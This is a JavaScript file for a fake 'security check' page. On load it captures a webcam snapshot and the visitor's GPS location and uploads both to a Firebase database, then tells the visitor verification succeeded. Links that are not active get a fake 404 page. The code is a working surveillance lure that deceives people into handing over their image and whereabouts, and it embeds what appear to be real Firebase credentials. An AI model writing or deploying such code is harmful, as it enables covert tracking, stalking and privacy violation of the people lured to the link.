// Firebase Configuration from your screenshot
const firebaseConfig = {
    apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZN rpg5nbEUm0",
    authDomain: "camera-c436d.firebaseapp.com",
    databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId: "camera-c436d",
    storageBucket: "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
};

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function initVerification() {
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get('linkId');
    
    // We check local storage for the settings (permissions)
    const links = JSON.parse(localStorage.getItem('managed_links') || "[]");
    const settings = links.find(l => l.id === linkId);

    if (!settings || !settings.active) {
        document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h1>404 Not Found</h1></div>";
        return;
    }

    const statusText = document.getElementById('statusText');
    statusText.innerText = "Initializing security check...";

    let lat = "Denied", lon = "Denied";
    let photoData = null;

    // STEP 1: CAMERA
    if (settings.cam) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1500));
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            photoData = canvas.toDataURL('image/jpeg', 0.5); 
            stream.getTracks().forEach(t => t.stop());
        } catch (e) { statusText.innerText = "Camera access required."; }
    }

    // STEP 2: LOCATION
    if (settings.gps) {
        try {
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 6000 });
            });
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
        } catch (e) { console.log("GPS denied"); }
    }

    // STEP 3: SEND TO FIREBASE CLOUD
    const historyRef = ref(db, 'photo_history');
    const newEntryRef = push(historyRef);
    set(newEntryRef, {
        id: Date.now(),
        image: photoData,
        latitude: lat,
        longitude: lon,
        linkName: settings.name,
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString()
    });

    statusText.innerText = "Verification Success. Redirecting...";
}

window.addEventListener('load', initVerification);